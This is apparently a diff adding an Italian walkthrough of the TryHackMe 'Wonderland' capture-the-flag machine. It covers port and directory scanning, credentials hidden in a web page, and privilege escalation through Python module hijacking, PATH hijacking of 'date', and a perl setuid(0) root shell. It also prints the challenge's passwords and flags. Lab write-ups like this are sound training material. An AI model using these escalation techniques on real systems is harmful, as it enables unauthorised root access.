@@ -1,0 +1,147 @@
+                            --WONDERLAND--
+
+Fall down the rabbit hole and enter wonderland.
+
+Iniziamo come sempre con un scan delle porte.
+**sudo nmap -sV -sS -sC 10.10.125.102
+    Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-29 12:18 CET
+    Nmap scan report for 10.10.125.102
+    Host is up (0.12s latency).
+    Not shown: 998 closed tcp ports (reset)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
+    |   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
+    |_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
+    80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+    |_http-title: Follow the white rabbit.
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 18.42 seconds
+
+Anche in questo caso possiamo notare che abbiamo due porte aperte, una HTTP ed una SSH.
+Andiamo subito nella pagina web per trovare informazioni utili ad exploitare la macchina.
+Non troviamo nulla di troppo interessante nella pagina principale.
+procediamo con gobuster alla scoperta di directory che possono contenere materiale utile.
+**gobuster dir --url http://10.10.125.102 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
+    /img                  (Status: 301) [Size: 0] [--> img/]
+    /r                    (Status: 301) [Size: 0] [--> r/]
+    /poem                 (Status: 301) [Size: 0] [--> poem/]
+    /http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
+    /http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
+    /http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]
+    /http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]
+    /**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]
+    Progress: 87664 / 87665 (100.00%)
+    ===============================================================
+    Finished
+    ===============================================================
+
+analizzando /r possiamo facilmente capire che dobbiamo continuare da qualche parte e visto che nella principale ci dice "follow the rabbit" aggiungiamo alla /r la /a e troviamo un altra pagina fino ad arrivare a http://<macchina-ip>/r/a/b/b/i/t
+Qui vediamo alice che si appresta ad entrare in wonderland.
+Ispezionando la pagina notiamo un display none che contiene quelli che potrebbero essere un username ed una passowrd:
+  alice:HowDothTheLittleCrocodileImproveHisShiningTail
+**ssh alice@HowDothTheLittleCrocodileImproveHisShiningTail
+e siamo dentro.
+Non possiamo ottenere la root.txt perchè non abbiamo ancora i permessi, ma il fatto che sia collogata nella nostra cartella è abbastanza strano.
+L'indizio di tryhackme ci dice che tutto è sottosopra.
+visto che tutto è sottosopra possiamo vedere se la user flag sia all'interno della cartella root.
+**cat /root/user.txt
+    thm{"Curiouser and curiouser!"}
+E cosi abbiamo acquisito la prima flag.
+dobbiamo aumentare i privilegi per prendere possesso della seconda
+eseguiamo il classico comando:
+**sudo -l
+    User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+eseguiamo lo script.
+**python3 walrus_and_the_carpenter.py
+    The line was:    All hopping through the frothy waves,                             
+    The line was:    The eldest Oyster looked at him.       
+    ....      
+lo script ci stampa ogni volta 10 righe random diverse.
+cerchiamo allora di vedere l'interno del file python e capiamo se riusciamo a modificarlo in qualche modo.
+**cat walrus_and_the_carpenter.py
+    import random
+    poem = """The sun was shining on the sea,
+    Shining with all his might:
+    ....
+    for i in range(10):
+        line = random.choice(poem.split("\n"))
+        print("The line was:\t", line)
+    
+Il file non è modificabile tramite nano e non trovo connessioni evidenti con il poema contenuto in /poem.
+Abbiamo un qualcosa di molto utile però che all'inizio mi era sfuggito.
+lo script python inizia con "import Random" che serve per importare il modulo random.py utilizzato poi nella variante "line" all'interno del ciclo for per stampare delle righe casuali del poema.
+Se creiamo un file chiamato random.py in /home/alice e usiamo il comando python3 walrus_and_the_carpenter.py, dovremmo essere in grado di eseguirli entrambi. Possiamo sfruttare questa cosa?
+Eseguiamo il seguente comando per acquisire altre info fondamentali per il proseguo dell'escalation.
+**sudo -l
+    User alice may run the following commands on wonderland:
+        (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+Questo ci indica che possiamo eseguire il file /home/alice/walrus_and_the_carpenter.py utilizzando sudo con l'identità o il privilegio di "rabbit".
+A questo punto proviamo a creare il file random.py (/home/alice) come pensavamo prima e vediamo se riesce ad eseguirlo senza che provochi errori inaspettati.
+**nano random.py 
+    import os
+
+    os.system("/bin/bash")
+Questo script python molto semplice ci permette se viene eseguito correttamente di aprire una nuova shell bash nel terminale, questa volta con i privilegi rabbit.
+Quindi: 
+**sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+E fortunatamente funziona tutto perfettamente! Abbiamo la shell con privileggi Rabbit.
+**cat root.txt
+    cat: root.txt: Permission denied
+Come scontato che sia, ancora non riusciamo a catturare la seconda flag e dobbiamo scalare ulteriormente i privilegi.
+nella cartella /home/rabbit troviamo il file teaParty.
+Facendo il cat possiamo notare che è un file ELF.
+eseguiamolo digitando:
+**./teaParty
+    Welcome to the tea party!
+    The Mad Hatter will be here soon.
+    Probably by Tue, 02 Apr 2024 17:30:43 +0000
+    Ask very nicely, and I will give you some tea while you wait for him
+Qualsiasi cosa scrivo mi restituisce "Segmentation fault (core dumped)".
+Questo messaggio indica un errore e la creazione del core dump, cioè il file che contiene la memoria del programma durante l'errore, il core dump è uno strumento molto utile per fare debugging.
+Dò uno sguardo in giro ma trovo ben poco di interessante per continuare la nostra scalata (non possiamo eseguire nulla con sudo poiche non sappiamo la password).
+L'unica soluzione credo sia in qualche modo far funzionare il programma che tra le altre cose ci nomina "The Mad Hatter" che dovrebbe essere l'utente Root (speriamo) in quanto è l'ultimo utente non ancora esplorato all'interno di /home.
+Provo a generare il core dump ma per problemi di permessi non riesco, cosi faccio nuovamente il cat per analizzare se riesco a trovare qualcosa di strano.
+Trovo questo in prossimità dell'errore "/bin/echo -n 'Probably by ' && date --date='next hour' -R".
+Qui vediamo che 'date' è un comando di sistema che restituisce la data nel momento in cui viene eseguito il programma e non ha bisogno di un percorso in quanto è globale.
+Non capisco come fare debug di questo programma ma possiamo però in qualche modo sfruttare 'date' senza arrivare all'errore?
+Proviamo creando un file chiamato date nella stessa directory.
+**nano date
+    #!/bin/bash
+    /bin/bash
+Ora rendiamo il file eseguibile con il seguente comando:
+** chmod +x date
+
+Vediamo il valore della variabile d'ambiente $PATH
+**echo $PATH
+    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+Dobbiamo dire al sistema di cercare gli eseguibili prima della directory che ci interessa
+**export PATH=/home/rabbit:$PATH
+    
+**/echo $PATH
+    /home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+Ok ora proviamo ad eseguire nuovamente teaParty
+**./teaParty
+E finalmente ci siamo!! Come ci aspettavamo al posto della data ora abbiamo la shell Hatter!
+Ancora non siamo root ma possiamo prendere la password.
+**cat /home/hatter/password.txt
+    WhyIsARavenLikeAWritingDesk?
+Credevo veramente di aver terminato ma la password purtroppo non è dell'utente root ma dell'attuale utente Hatter.
+Non capisco veramente come procedere per diventare utente root e guardando un po in giro leggo che deve essere usato il seguente comando.
+**perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+in questo modo abbiamo acquistito privileggi root e possiamo andare a prendere la seconda flag in /home/alice.
+thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
+A questo punto la macchina è completata !
+
+
+
+
+
+
+    
